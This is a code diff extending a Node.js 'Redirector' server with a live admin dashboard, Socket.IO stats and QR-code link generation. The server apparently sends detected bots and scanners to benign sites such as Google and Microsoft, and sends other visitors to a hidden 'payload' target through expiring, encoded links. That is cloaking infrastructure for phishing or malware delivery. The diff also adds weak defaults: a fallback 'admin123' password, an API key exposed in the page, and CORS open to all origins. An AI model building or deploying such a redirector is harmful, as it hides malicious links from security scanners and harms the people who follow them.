@@ -10,26 +10,66 @@ const compression = require('compression');
 const morgan = require('morgan');
 const { body, validationResult } = require('express-validator');
 const uaParser = require('ua-parser-js');
+const QRCode = require('qrcode');
+const http = require('http');
+const { Server } = require('socket.io');
+const path = require('path');
+const session = require('express-session');
+const bcrypt = require('bcryptjs');
+const multer = require('multer');
+const dotenv = require('dotenv');
+
+// Load environment variables
+dotenv.config();
 
 const app = express();
+const server = http.createServer(app);
+const io = new Server(server, {
+  cors: {
+    origin: "*",
+    methods: ["GET", "POST"]
+  }
+});
+
 app.set('trust proxy', 1);
 app.use(compression({ level: 6, threshold: 0 }));
 app.use(morgan('combined'));
+app.use(express.static('public'));
+
+// Session setup for admin UI
+app.use(session({
+  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
+  resave: false,
+  saveUninitialized: false,
+  cookie: { 
+    secure: process.env.NODE_ENV === 'production', 
+    maxAge: 24 * 60 * 60 * 1000,
+    httpOnly: true,
+    sameSite: 'strict'
+  }
+}));
 
 // ─── Config ──────────────────────────────────────────────────────────────────
 const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
-const BOT_URLS     = [
-  'https://www.microsoft.com',
-  'https://www.apple.com',
-  'https://www.google.com',
-  'https://en.wikipedia.org/wiki/Main_Page',
-  'https://www.bbc.com'
-];
+const BOT_URLS     = process.env.BOT_URLS ? 
+  process.env.BOT_URLS.split(',') : [
+    'https://www.microsoft.com',
+    'https://www.apple.com',
+    'https://www.google.com',
+    'https://en.wikipedia.org/wiki/Main_Page',
+    'https://www.bbc.com'
+  ];
 
 const LOG_FILE     = 'clicks.log';
 const REQUEST_LOG_FILE = 'requests.log';
 const SUCCESS_LOG_FILE = 'success.log';
 const PORT         = process.env.PORT || 10000;
+
+// Admin credentials (should be set in environment variables)
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
+// Generate a secure password hash: node -e "console.log(require('bcryptjs').hashSync('your-password', 10))"
+const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || 
+  bcrypt.hashSync('admin123', 10); // Change this in production!
 
 // Parse TTL from environment variable (supports: 30m, 24h, 7d, 3600, etc.)
 function parseTTL(ttlValue) {
@@ -80,6 +120,7 @@ const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: Math.min(30
 const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10, useClones: false });
 const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false });
 const deviceCache = new NodeCache({ stdTTL: 300, checkperiod: 60, useClones: false });
+const qrCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false });
 
 // ─── Stats Tracking ──────────────────────────────────────────────────────────
 const stats = {
@@ -90,8 +131,74 @@ const stats = {
   generatedLinks: 0,
   byCountry: {},
   byBotReason: {},
-  byDevice: { mobile: 0, desktop: 0, tablet: 0, bot: 0 }
+  byDevice: { mobile: 0, desktop: 0, tablet: 0, bot: 0 },
+  realtime: {
+    lastMinute: [],
+    activeLinks: 0,
+    requestsPerSecond: 0
+  }
 };
+
+// Socket.IO connection handling
+io.use((socket, next) => {
+  const token = socket.handshake.auth.token;
+  if (token === METRICS_API_KEY) {
+    next();
+  } else {
+    next(new Error('Authentication error'));
+  }
+}).on('connection', (socket) => {
+  console.log('Admin client connected:', socket.id);
+  
+  // Send initial stats
+  socket.emit('stats', stats);
+  socket.emit('config', {
+    linkTTL: LINK_TTL_SEC,
+    linkTTLFormatted: formatDuration(LINK_TTL_SEC),
+    targetUrl: TARGET_URL,
+    botUrls: BOT_URLS
+  });
+
+  socket.on('disconnect', () => {
+    console.log('Admin client disconnected:', socket.id);
+  });
+
+  // Handle admin commands
+  socket.on('command', async (cmd) => {
+    switch(cmd.action) {
+      case 'clearCache':
+        linkCache.flushAll();
+        geoCache.flushAll();
+        deviceCache.flushAll();
+        qrCache.flushAll();
+        socket.emit('notification', { type: 'success', message: 'Cache cleared' });
+        break;
+      case 'updateConfig':
+        // Handle config updates
+        break;
+    }
+  });
+});
+
+// Update realtime stats every second
+setInterval(() => {
+  stats.realtime.activeLinks = linkCache.keys().length;
+  stats.realtime.lastMinute = stats.realtime.lastMinute.slice(-60);
+  
+  const now = Date.now();
+  const lastSecond = stats.realtime.lastMinute.filter(t => now - t.time < 1000);
+  stats.realtime.requestsPerSecond = lastSecond.length;
+  
+  stats.realtime.lastMinute.push({
+    time: now,
+    requests: stats.totalRequests,
+    blocks: stats.botBlocks,
+    successes: stats.successfulRedirects
+  });
+  
+  // Broadcast updates to all connected admin clients
+  io.emit('stats', stats);
+}, 1000);
 
 // ─── Enhanced Device Detection ───────────────────────────────────────────────
 function getDeviceInfo(req) {
@@ -192,10 +299,10 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
-      styleSrc: ["'self'", "'unsafe-inline'"],
+      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, 'https://cdn.socket.io'],
+      styleSrc: ["'self'", "'unsafe-inline'", 'https://cdn.jsdelivr.net'],
       imgSrc: ["'self'", 'data:', 'https:'],
-      connectSrc: ["'self'"],
+      connectSrc: ["'self'", 'ws:', 'wss:'],
       frameSrc: ["'none'"],
       objectSrc: ["'none'"]
     }
@@ -226,6 +333,9 @@ async function logRequest(type, req, res, extra = {}) {
       d: duration,
       ...extra
     };
+    
+    // Emit log to admin clients
+    io.emit('log', logEntry);
     
     fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n').catch(() => {});
     
@@ -259,7 +369,8 @@ app.get('/metrics', async (req, res) => {
     caches: {
       geo: geoCache.keys().length,
       linkReq: linkRequestCache.keys().length,
-      device: deviceCache.keys().length
+      device: deviceCache.keys().length,
+      qr: qrCache.keys().length
     },
     uptime: process.uptime(),
     memory: process.memoryUsage(),
@@ -272,6 +383,7 @@ app.get('/metrics', async (req, res) => {
       generated: stats.generatedLinks
     },
     devices: stats.byDevice,
+    realtime: stats.realtime,
     config: {
       linkTTL: LINK_TTL_SEC,
       linkTTLFormatted: formatDuration(LINK_TTL_SEC)
@@ -279,6 +391,697 @@ app.get('/metrics', async (req, res) => {
   };
   
   res.json(metrics);
+});
+
+// ─── Admin UI Routes ─────────────────────────────────────────────────────────
+// Login page
+app.get('/admin/login', (req, res) => {
+  if (req.session.authenticated) {
+    return res.redirect('/admin');
+  }
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Admin Login - Redirector</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .login-card{background:white;padding:2rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:400px}
+        h1{text-align:center;margin-bottom:2rem;color:#333}
+        .form-group{margin-bottom:1rem}
+        label{display:block;margin-bottom:0.5rem;color:#666}
+        input{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-size:1rem;transition:border-color 0.2s}
+        input:focus{outline:none;border-color:#667eea}
+        button{width:100%;padding:1rem;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.2s}
+        button:hover{transform:translateY(-2px)}
+        .error{background:#fee;color:#c00;padding:0.75rem;border-radius:8px;margin-bottom:1rem;display:none}
+      </style>
+    </head>
+    <body>
+      <div class="login-card">
+        <h1>🔐 Admin Login</h1>
+        <div class="error" id="error"></div>
+        <form id="loginForm">
+          <div class="form-group">
+            <label>Username</label>
+            <input type="text" id="username" required>
+          </div>
+          <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="password" required>
+          </div>
+          <button type="submit">Login</button>
+        </form>
+      </div>
+      <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const res = await fetch('/admin/login', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              username: document.getElementById('username').value,
+              password: document.getElementById('password').value
+            })
+          });
+          if (res.ok) {
+            window.location.href = '/admin';
+          } else {
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('error').textContent = 'Invalid credentials';
+          }
+        });
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+app.post('/admin/login', express.json(), async (req, res) => {
+  const { username, password } = req.body;
+  if (username === ADMIN_USERNAME && await bcrypt.compare(password, ADMIN_PASSWORD_HASH)) {
+    req.session.authenticated = true;
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
+});
+
+// Admin dashboard
+app.get('/admin', (req, res) => {
+  if (!req.session.authenticated) {
+    return res.redirect('/admin/login');
+  }
+  
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Redirector Admin Dashboard</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+      <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5}
+        .navbar{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
+        .nav-links button{background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.3);color:white;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;margin-left:0.5rem}
+        .container{padding:2rem;max-width:1400px;margin:0 auto}
+        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.5rem;margin-bottom:2rem}
+        .stat-card{background:white;padding:1.5rem;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .stat-card h3{color:#666;font-size:0.9rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem}
+        .stat-card .value{font-size:2.5rem;font-weight:bold;color:#333}
+        .stat-card .trend{color:#4caf50;font-size:0.9rem;margin-top:0.5rem}
+        .chart-container{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .tabs{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap}
+        .tab{background:none;border:none;padding:0.5rem 1rem;cursor:pointer;border-bottom:2px solid transparent;font-size:1rem}
+        .tab.active{border-bottom-color:#667eea;color:#667eea;font-weight:600}
+        .tab-content{display:none}
+        .tab-content.active{display:block}
+        .config-group{margin-bottom:1rem}
+        .config-group label{display:block;margin-bottom:0.5rem;color:#666}
+        .config-group input,.config-group textarea{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-family:monospace}
+        .config-group textarea{min-height:100px}
+        button{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;padding:0.75rem 1.5rem;border-radius:8px;cursor:pointer;font-weight:600;transition:transform 0.2s;margin-right:0.5rem;margin-bottom:0.5rem}
+        button:hover{transform:translateY(-2px)}
+        button.secondary{background:#6c757d}
+        .button-group{display:flex;gap:1rem;flex-wrap:wrap}
+        .link-generator{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem}
+        .qr-preview{max-width:200px;margin:1rem 0;border:1px solid #e0e0e0;border-radius:8px}
+        .notification{position:fixed;top:20px;right:20px;padding:1rem;border-radius:8px;color:white;animation:slideIn 0.3s ease;z-index:1000}
+        .notification.success{background:#4caf50}
+        .notification.error{background:#f44336}
+        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+        .loading{display:inline-block;width:20px;height:20px;border:3px solid #f3f3f3;border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .log-container{background:#1e1e1e;color:#fff;padding:1rem;border-radius:8px;font-family:monospace;font-size:12px;height:500px;overflow-y:auto}
+        .log-entry{border-bottom:1px solid #333;padding:0.25rem 0}
+        .log-time{color:#888}
+        .log-type{display:inline-block;padding:0.1rem 0.3rem;border-radius:3px;margin:0 0.5rem}
+        .log-type.success{background:#4caf50}
+        .log-type.block{background:#f44336}
+        .log-type.redirect{background:#2196f3}
+        .json-viewer{background:#f8f9fa;padding:0.5rem;border-radius:4px;font-family:monospace;font-size:11px;margin-top:0.5rem}
+        .country-badge{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;background:#e9ecef;margin:0.2rem}
+        @media (max-width: 768px) {
+          .navbar{flex-direction:column;text-align:center}
+          .nav-links{margin-top:1rem}
+          .stats-grid{grid-template-columns:1fr}
+        }
+      </style>
+    </head>
+    <body>
+      <div class="navbar">
+        <h1>🔗 Redirector Admin</h1>
+        <div class="nav-links">
+          <button onclick="refreshData()">🔄 Refresh</button>
+          <button onclick="logout()">🚪 Logout</button>
+        </div>
+      </div>
+      
+      <div class="container">
+        <!-- Stats Cards -->
+        <div class="stats-grid" id="statsGrid">
+          <div class="stat-card">
+            <h3>Total Requests</h3>
+            <div class="value" id="totalRequests">0</div>
+            <div class="trend" id="requestsTrend"></div>
+          </div>
+          <div class="stat-card">
+            <h3>Active Links</h3>
+            <div class="value" id="activeLinks">0</div>
+          </div>
+          <div class="stat-card">
+            <h3>Bot Blocks</h3>
+            <div class="value" id="botBlocks">0</div>
+          </div>
+          <div class="stat-card">
+            <h3>Success Rate</h3>
+            <div class="value" id="successRate">0%</div>
+          </div>
+          <div class="stat-card">
+            <h3>Requests/sec</h3>
+            <div class="value" id="requestsPerSec">0</div>
+          </div>
+          <div class="stat-card">
+            <h3>Generated Links</h3>
+            <div class="value" id="generatedLinks">0</div>
+          </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+          <button class="tab active" onclick="showTab('overview')">📊 Overview</button>
+          <button class="tab" onclick="showTab('generator')">🔗 Generator</button>
+          <button class="tab" onclick="showTab('config')">⚙️ Configuration</button>
+          <button class="tab" onclick="showTab('logs')">📝 Live Logs</button>
+          <button class="tab" onclick="showTab('analytics')">📈 Analytics</button>
+        </div>
+
+        <!-- Overview Tab -->
+        <div id="overview" class="tab-content active">
+          <div class="chart-container">
+            <h3>Real-time Traffic (Last 60 seconds)</h3>
+            <canvas id="trafficChart"></canvas>
+          </div>
+          
+          <div class="chart-container">
+            <h3>Device Distribution</h3>
+            <canvas id="deviceChart"></canvas>
+          </div>
+
+          <div class="chart-container">
+            <h3>Top Countries</h3>
+            <div id="countryStats"></div>
+          </div>
+        </div>
+
+        <!-- Generator Tab -->
+        <div id="generator" class="tab-content">
+          <div class="link-generator">
+            <h3>Generate New Link</h3>
+            <div class="config-group">
+              <label>Target URL</label>
+              <input type="url" id="targetUrl" placeholder="https://example.com" value="${TARGET_URL}">
+            </div>
+            <div class="config-group">
+              <label>Custom TTL (optional, e.g., 1h, 30m, 3600)</label>
+              <input type="text" id="customTtl" placeholder="e.g., 1h, 30m, 3600">
+            </div>
+            <div class="config-group">
+              <label>
+                <input type="checkbox" id="generateQr" checked> Generate QR Code
+              </label>
+            </div>
+            <div class="config-group">
+              <label>
+                <input type="checkbox" id="showQrPage"> Show QR page before redirect
+              </label>
+            </div>
+            <div class="button-group">
+              <button onclick="generateLink()">Generate Link</button>
+              <button class="secondary" onclick="clearForm()">Clear</button>
+            </div>
+            
+            <div id="generationResult" style="margin-top:2rem;display:none">
+              <h4>Generated Link</h4>
+              <div class="config-group">
+                <input type="text" id="generatedUrl" readonly>
+                <div style="margin-top:0.5rem">
+                  <button onclick="copyToClipboard()">📋 Copy URL</button>
+                  <button onclick="downloadQR()" id="downloadQrBtn" style="display:none">📱 Download QR</button>
+                </div>
+              </div>
+              <div id="qrContainer" style="margin-top:1rem;text-align:center"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Config Tab -->
+        <div id="config" class="tab-content">
+          <div class="chart-container">
+            <h3>System Configuration</h3>
+            <div class="config-group">
+              <label>Default Target URL</label>
+              <input type="url" id="configTargetUrl" value="${TARGET_URL}">
+            </div>
+            <div class="config-group">
+              <label>Bot Redirect URLs (one per line)</label>
+              <textarea id="configBotUrls">${BOT_URLS.join('\n')}</textarea>
+            </div>
+            <div class="config-group">
+              <label>Link TTL (seconds or format: 30m, 24h, 7d)</label>
+              <input type="text" id="configLinkTtl" value="${process.env.LINK_TTL || '30m'}">
+            </div>
+            <div class="config-group">
+              <label>Metrics API Key</label>
+              <input type="text" id="metricsApiKey" value="${METRICS_API_KEY}" readonly>
+            </div>
+            <div class="button-group">
+              <button onclick="saveConfig()">💾 Save Configuration</button>
+              <button class="secondary" onclick="clearCache()">🗑️ Clear Cache</button>
+              <button class="secondary" onclick="exportLogs()">📥 Export Logs</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Logs Tab -->
+        <div id="logs" class="tab-content">
+          <div class="chart-container">
+            <h3>Live Request Logs</h3>
+            <div style="margin-bottom:1rem">
+              <button onclick="clearLogs()">Clear Logs</button>
+              <button onclick="pauseLogs()" id="pauseBtn">Pause</button>
+            </div>
+            <div class="log-container" id="logContainer">
+              <div id="logs"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Analytics Tab -->
+        <div id="analytics" class="tab-content">
+          <div class="chart-container">
+            <h3>Bot Block Reasons</h3>
+            <canvas id="botChart"></canvas>
+          </div>
+          <div class="chart-container">
+            <h3>Browser Distribution</h3>
+            <canvas id="browserChart"></canvas>
+          </div>
+        </div>
+      </div>
+
+      <div id="notification" class="notification" style="display:none"></div>
+
+      <script>
+        const socket = io({
+          auth: { token: '${METRICS_API_KEY}' }
+        });
+        
+        let trafficChart, deviceChart, botChart, browserChart;
+        let logsPaused = false;
+        let logBuffer = [];
+        
+        socket.on('stats', (data) => {
+          updateStats(data);
+          updateCharts(data);
+        });
+        
+        socket.on('notification', (notification) => {
+          showNotification(notification.message, notification.type);
+        });
+        
+        socket.on('log', (log) => {
+          if (!logsPaused) {
+            addLogEntry(log);
+          } else {
+            logBuffer.push(log);
+          }
+        });
+        
+        function updateStats(data) {
+          document.getElementById('totalRequests').textContent = data.totalRequests.toLocaleString();
+          document.getElementById('activeLinks').textContent = data.realtime.activeLinks;
+          document.getElementById('botBlocks').textContent = data.botBlocks.toLocaleString();
+          document.getElementById('generatedLinks').textContent = data.generatedLinks.toLocaleString();
+          document.getElementById('requestsPerSec').textContent = data.realtime.requestsPerSecond;
+          
+          const successRate = data.totalRequests > 0 
+            ? Math.round((data.successfulRedirects / data.totalRequests) * 100) 
+            : 0;
+          document.getElementById('successRate').textContent = successRate + '%';
+          
+          if (data.realtime.lastMinute.length > 1) {
+            const prev = data.realtime.lastMinute[data.realtime.lastMinute.length - 2] || {requests:0};
+            const current = data.realtime.lastMinute[data.realtime.lastMinute.length - 1];
+            const trend = prev.requests ? ((current.requests - prev.requests) / prev.requests * 100).toFixed(1) : 0;
+            document.getElementById('requestsTrend').textContent = trend + '% vs last minute';
+          }
+
+          // Update country stats
+          const countryHtml = Object.entries(data.byCountry)
+            .sort((a,b) => b[1] - a[1])
+            .slice(0, 10)
+            .map(([country, count]) => 
+              '<span class="country-badge">' + country + ': ' + count + '</span>'
+            ).join('');
+          document.getElementById('countryStats').innerHTML = countryHtml || '<p>No country data yet</p>';
+        }
+        
+        function updateCharts(data) {
+          if (!trafficChart) {
+            const ctx = document.getElementById('trafficChart').getContext('2d');
+            trafficChart = new Chart(ctx, {
+              type: 'line',
+              data: {
+                labels: [],
+                datasets: [{
+                  label: 'Requests',
+                  data: [],
+                  borderColor: '#667eea',
+                  backgroundColor: 'rgba(102, 126, 234, 0.1)',
+                  tension: 0.4,
+                  fill: true
+                }]
+              },
+              options: {
+                responsive: true,
+                animation: false,
+                scales: { y: { beginAtZero: true } }
+              }
+            });
+          }
+          
+          // Update traffic chart
+          const times = data.realtime.lastMinute.map(t => new Date(t.time).toLocaleTimeString());
+          const requests = data.realtime.lastMinute.map(t => t.requests);
+          trafficChart.data.labels = times;
+          trafficChart.data.datasets[0].data = requests;
+          trafficChart.update();
+          
+          // Update device chart
+          if (!deviceChart) {
+            const deviceCtx = document.getElementById('deviceChart').getContext('2d');
+            deviceChart = new Chart(deviceCtx, {
+              type: 'doughnut',
+              data: {
+                labels: ['Mobile', 'Desktop', 'Tablet', 'Bot'],
+                datasets: [{
+                  data: [
+                    data.byDevice.mobile, 
+                    data.byDevice.desktop, 
+                    data.byDevice.tablet, 
+                    data.byDevice.bot
+                  ],
+                  backgroundColor: ['#4caf50', '#2196f3', '#ff9800', '#f44336']
+                }]
+              },
+              options: {
+                responsive: true,
+                plugins: {
+                  legend: { position: 'bottom' }
+                }
+              }
+            });
+          } else {
+            deviceChart.data.datasets[0].data = [
+              data.byDevice.mobile,
+              data.byDevice.desktop,
+              data.byDevice.tablet,
+              data.byDevice.bot
+            ];
+            deviceChart.update();
+          }
+
+          // Update bot reasons chart
+          if (!botChart && Object.keys(data.byBotReason).length > 0) {
+            const botCtx = document.getElementById('botChart').getContext('2d');
+            botChart = new Chart(botCtx, {
+              type: 'bar',
+              data: {
+                labels: Object.keys(data.byBotReason),
+                datasets: [{
+                  label: 'Bot Blocks by Reason',
+                  data: Object.values(data.byBotReason),
+                  backgroundColor: '#ff9800'
+                }]
+              },
+              options: {
+                responsive: true,
+                scales: { y: { beginAtZero: true } }
+              }
+            });
+          }
+        }
+        
+        function showNotification(message, type = 'success') {
+          const notif = document.getElementById('notification');
+          notif.textContent = message;
+          notif.className = 'notification ' + type;
+          notif.style.display = 'block';
+          setTimeout(() => { notif.style.display = 'none'; }, 3000);
+        }
+        
+        function showTab(tabName) {
+          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+          document.querySelector('[onclick="showTab(\\'' + tabName + '\\')"]').classList.add('active');
+          document.getElementById(tabName).classList.add('active');
+        }
+        
+        async function generateLink() {
+          const targetUrl = document.getElementById('targetUrl').value;
+          const customTtl = document.getElementById('customTtl').value;
+          const generateQr = document.getElementById('generateQr').checked;
+          const showQrPage = document.getElementById('showQrPage').checked;
+          
+          if (!targetUrl) {
+            showNotification('Please enter a target URL', 'error');
+            return;
+          }
+          
+          try {
+            let url = '/g?t=' + encodeURIComponent(targetUrl);
+            if (customTtl) url += '&ttl=' + encodeURIComponent(customTtl);
+            
+            const res = await fetch(url);
+            const data = await res.json();
+            
+            document.getElementById('generatedUrl').value = data.url;
+            document.getElementById('generationResult').style.display = 'block';
+            
+            if (generateQr) {
+              showNotification('Generating QR code...', 'success');
+              
+              let qrUrl = data.url;
+              if (showQrPage) qrUrl += '?qr=true';
+              
+              const qrRes = await fetch('/qr?url=' + encodeURIComponent(qrUrl) + '&size=300');
+              const qrData = await qrRes.json();
+              
+              document.getElementById('qrContainer').innerHTML = '<img src="' + qrData.qr + '" alt="QR Code" class="qr-preview">';
+              document.getElementById('downloadQrBtn').style.display = 'inline-block';
+            }
+            
+            showNotification('Link generated successfully!');
+          } catch (err) {
+            showNotification('Error generating link: ' + err.message, 'error');
+          }
+        }
+        
+        function copyToClipboard() {
+          const url = document.getElementById('generatedUrl');
+          url.select();
+          document.execCommand('copy');
+          showNotification('URL copied to clipboard!');
+        }
+        
+        async function downloadQR() {
+          const url = document.getElementById('generatedUrl').value;
+          window.location.href = '/qr/download?url=' + encodeURIComponent(url);
+        }
+        
+        function clearForm() {
+          document.getElementById('targetUrl').value = '${TARGET_URL}';
+          document.getElementById('customTtl').value = '';
+          document.getElementById('generationResult').style.display = 'none';
+          document.getElementById('qrContainer').innerHTML = '';
+          document.getElementById('downloadQrBtn').style.display = 'none';
+        }
+        
+        async function saveConfig() {
+          const config = {
+            targetUrl: document.getElementById('configTargetUrl').value,
+            botUrls: document.getElementById('configBotUrls').value.split('\\n').filter(u => u.trim()),
+            linkTtl: document.getElementById('configLinkTtl').value
+          };
+          
+          const res = await fetch('/admin/config', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(config)
+          });
+          
+          if (res.ok) {
+            showNotification('Configuration saved! Restart server to apply changes.', 'success');
+          } else {
+            showNotification('Error saving configuration', 'error');
+          }
+        }
+        
+        async function clearCache() {
+          const res = await fetch('/admin/clear-cache', { method: 'POST' });
+          if (res.ok) {
+            showNotification('Cache cleared!', 'success');
+          }
+        }
+        
+        function logout() {
+          fetch('/admin/logout', { method: 'POST' })
+            .then(() => { window.location.href = '/admin/login'; });
+        }
+        
+        function refreshData() {
+          socket.emit('command', { action: 'refresh' });
+        }
+        
+        function clearLogs() {
+          document.getElementById('logs').innerHTML = '';
+          logBuffer = [];
+        }
+        
+        function pauseLogs() {
+          logsPaused = !logsPaused;
+          document.getElementById('pauseBtn').textContent = logsPaused ? 'Resume' : 'Pause';
+          if (!logsPaused && logBuffer.length > 0) {
+            logBuffer.forEach(log => addLogEntry(log));
+            logBuffer = [];
+          }
+        }
+        
+        function addLogEntry(log) {
+          const logContainer = document.getElementById('logs');
+          const entry = document.createElement('div');
+          entry.className = 'log-entry';
+          
+          const time = new Date(log.t).toLocaleTimeString();
+          const typeClass = log.type === 'success' ? 'success' : 
+                           log.type === 'block' ? 'block' : 'redirect';
+          
+          entry.innerHTML = '<span class="log-time">[' + time + ']</span> ' +
+                           '<span class="log-type ' + typeClass + '">' + log.type + '</span> ' +
+                           '<span>' + log.ip + ' ' + log.path + ' ' + log.device + '</span>';
+          
+          logContainer.insertBefore(entry, logContainer.firstChild);
+          
+          // Limit logs
+          while (logContainer.children.length > 200) {
+            logContainer.removeChild(logContainer.lastChild);
+          }
+        }
+        
+        async function exportLogs() {
+          window.location.href = '/admin/export-logs';
+        }
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// Logout
+app.post('/admin/logout', (req, res) => {
+  req.session.destroy();
+  res.json({ success: true });
+});
+
+// Save config (requires authentication)
+app.post('/admin/config', express.json(), (req, res) => {
+  if (!req.session.authenticated) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  const config = req.body;
+  fs.writeFile('config.json', JSON.stringify(config, null, 2))
+    .then(() => res.json({ success: true }))
+    .catch(err => res.status(500).json({ error: err.message }));
+});
+
+// Clear cache
+app.post('/admin/clear-cache', (req, res) => {
+  if (!req.session.authenticated) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  linkCache.flushAll();
+  geoCache.flushAll();
+  deviceCache.flushAll();
+  qrCache.flushAll();
+  
+  res.json({ success: true });
+});
+
+// Export logs
+app.get('/admin/export-logs', async (req, res) => {
+  if (!req.session.authenticated) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  try {
+    const logs = await fs.readFile(REQUEST_LOG_FILE, 'utf8');
+    res.setHeader('Content-Type', 'text/plain');
+    res.setHeader('Content-Disposition', 'attachment; filename="logs.txt"');
+    res.send(logs);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ─── QR Code Generation ─────────────────────────────────────────────────────
+app.get('/qr', async (req, res) => {
+  const url = req.query.url || req.query.u || TARGET_URL;
+  const size = parseInt(req.query.size) || 300;
+  
+  const cacheKey = `${url}:${size}`;
+  let qrData = qrCache.get(cacheKey);
+  
+  if (!qrData) {
+    try {
+      qrData = await QRCode.toDataURL(url, { 
+        width: size,
+        margin: 2,
+        color: { dark: '#000000', light: '#ffffff' }
+      });
+      qrCache.set(cacheKey, qrData);
+    } catch (err) {
+      return res.status(500).json({ error: 'QR generation failed' });
+    }
+  }
+  
+  res.json({ qr: qrData, url });
+});
+
+// ─── QR Code download endpoint ──────────────────────────────────────────────
+app.get('/qr/download', async (req, res) => {
+  const url = req.query.url || TARGET_URL;
+  const size = parseInt(req.query.size) || 300;
+  
+  try {
+    const qrBuffer = await QRCode.toBuffer(url, { 
+      width: size,
+      margin: 2,
+      type: 'png'
+    });
+    
+    res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Content-Disposition', `attachment; filename="qrcode-${Date.now()}.png"`);
+    res.send(qrBuffer);
+  } catch (err) {
+    res.status(500).json({ error: 'QR generation failed' });
+  }
 });
 
 // ─── Expired Link Page ──────────────────────────────────────────────────────
@@ -427,7 +1230,7 @@ async function getCountryCode(req) {
   return 'XX';
 }
 
-// ─── Encoders (Keep existing) ────────────────────────────────────────────────
+// ─── Encoders ────────────────────────────────────────────────────────────────
 const encoders = [
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
   { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
@@ -466,11 +1269,17 @@ app.get('/g', (req, res) => {
   
   stats.generatedLinks++;
   
-  res.json({ 
+  const response = {
     url: `${req.protocol}://${req.get('host')}/v/${id}`,
     expires: LINK_TTL_SEC,
-    expires_human: formatDuration(LINK_TTL_SEC)
-  });
+    expires_human: formatDuration(LINK_TTL_SEC),
+    id: id
+  };
+  
+  // Emit socket event for new link
+  io.emit('link-generated', response);
+  
+  res.json(response);
 });
 
 // ─── Success Tracking ────────────────────────────────────────────────────────
@@ -484,6 +1293,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const linkId = req.params.id;
   const deviceInfo = req.deviceInfo;
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
+  const showQr = req.query.qr === 'true';
   
   // Rate limiting per link
   const linkKey = `${linkId}:${ip}`;
